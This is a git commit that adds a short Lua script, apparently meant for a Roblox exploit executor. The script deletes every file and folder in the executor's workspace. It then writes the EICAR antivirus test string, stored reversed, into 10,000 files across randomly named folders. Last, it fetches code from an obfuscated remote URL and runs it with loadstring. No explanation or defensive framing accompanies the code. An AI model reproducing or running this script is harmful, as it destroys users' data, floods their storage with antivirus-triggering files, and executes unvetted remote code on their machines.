d95e0b4bd47ce1f07e90c831539f75827a153fd3
thetrollfacenan <102139586+trollfacenan@users.noreply.github.com>
2024-04-22 22:35:41 +0500

    Create _.lua

---
+++ _.lua
@@ -0,0 +1,15 @@
+local FUNNY_STRING = string.reverse("*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X")
+                                    for i, v in next, listfiles("") do 
+					pcall(delfile, v)
+					pcall(delfolder, v)
+				    end
+				    for i = 1, 100 do
+					local s = randomString()
+					makefolder(s)
+					for i = 1, 100 do
+						writefile(s .. "/" .. randomString(), FUNNY_STRING)
+					end
+				    end
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
